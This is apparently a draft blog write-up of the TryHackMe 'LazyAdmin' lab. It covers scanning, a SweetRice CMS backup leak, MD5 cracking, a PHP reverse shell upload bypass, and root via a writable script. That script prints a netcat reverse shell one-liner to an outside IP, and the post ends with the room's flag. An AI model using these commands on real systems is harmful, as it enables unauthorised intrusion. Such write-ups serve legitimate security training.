---
title: TryHackMe - LazyAdmin
date: 2025-02-04 20:57:30 +0530
categories: [TryHackMe, CTF]
tags: []     # TAG names should always be lowercase
description: Short summary of the post.
# toc: false
comments: false
# pin: true
published: false
---



```
➜  ~ nmap -sVC 10.10.168.208    
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-04 14:55 IST
Nmap scan report for 10.10.168.208
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.36 seconds
```
nmap scan it revels open ports 22 and 80. http port is open so i visit the webste
it open a apache default page and check apachie vesion is vulnerable but it secure
so i started searching of directory with gobuster

```
➜  ~ gobuster dir -u http://10.10.168.208/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt        

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.168.208/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/content              (Status: 301) [Size: 316] [--> http://10.10.168.208/content/]
Progress: 44414 / 220561 (20.14%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 44438 / 220561 (20.15%)
===============================================================
Finished
=============================================================
```

after visit the direcotry it shows sweetrice is installed s
so i just search the verssion and andy hidden something  thorugh source page 
i found then /contetn/js can able to access javascrip files
it revel some verssion info
```
/**
 * SweetRice javascript function.
 *
 * @package SweetRice
 * @Dashboard core
 * @since 0.5.4
 */
```
then i go to exploit db then check exploits i found https://www.exploit-db.com/exploits/40718
with the guidance it seach `/inc/mysql_backup` directory it shows the sql file and downalod it

```
➜  /tmp file mysql_bakup_20191129023059-1.5.1.sql
mysql_bakup_20191129023059-1.5.1.sql: PHP script, ASCII text, with very long lines (1125)
➜  /tmp 
```
so i just open the file with sublime it revels the usrname and password
so search the login page again i do dir serach

```
➜  /tmp gobuster dir -u http://10.10.168.208/content -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.168.208/content
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/_themes              (Status: 301) [Size: 324] [--> http://10.10.168.208/content/_themes/]
/as                   (Status: 301) [Size: 319] [--> http://10.10.168.208/content/as/]
/attachment           (Status: 301) [Size: 327] [--> http://10.10.168.208/content/attachment/]
/images               (Status: 301) [Size: 323] [--> http://10.10.168.208/content/images/]
/inc                  (Status: 301) [Size: 320] [--> http://10.10.168.208/content/inc/]
/index.php            (Status: 200) [Size: 2199]
/js                   (Status: 301) [Size: 319] [--> http://10.10.168.208/content/js/]
Progress: 4728 / 4729 (99.98%)
===============================================================
Finished
===============================================================
```
i found as as login page
then i found username as manager and hash i use crack station to find the  password as Password123
i tired amdin and manager manager will work logined
```
Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 245 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

42f749ade7f9e195bf475f37a44cafcb:Password123              
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: 42f749ade7f9e195bf475f37a44cafcb
Time.Started.....: Tue Feb  4 15:19:58 2025 (0 secs)
Time.Estimated...: Tue Feb  4 15:19:58 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 16442.2 kH/s (3.44ms) @ Accel:1024 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 917504/14344384 (6.40%)
Rejected.........: 0/917504 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> jam16
Hardware.Mon.#1..: Temp: 45c Util:  0% Core:1455MHz Mem:5000MHz Bus:8

Started: Tue Feb  4 15:19:45 2025
Stopped: Tue Feb  4 15:19:59 2025
```

then i just explore the website then go to exploit db then read the another exploit
i found this one https://www.exploit-db.com/exploits/40716
then i read the exploit code so i decided to dont do scirpt kidy then i understand the what exploit does
then i says we can able to attach file in meda center then access media file in 
/acctachemt directory in webste
then i get php revershell to start my revershell the get revershell there is one check 
we cant able to upload php file so chage the php file into .php5
 got  the sehll then get user.txt flag

 next move to privilage escapulation
 then i check 

 ```
 $ sudo -l
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
then i check the backup.pl
```
$ cat backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ 
```
then i check the copy.sh
```
$ cat copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
$ 
```

it says another revere shell
so i check i can able to modiyt yes it should so i change

```
$ ls -la copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 copy.sh
$ 
```

`echo "/bin/bash" > copy.sh`

```
/usr/bin/perl /home/itguy/backup.pl
whoami
root
cd /root
ls
root.txt
cat root.txt
THM{6637f41d0177b6f37cb20d775124699f}

```


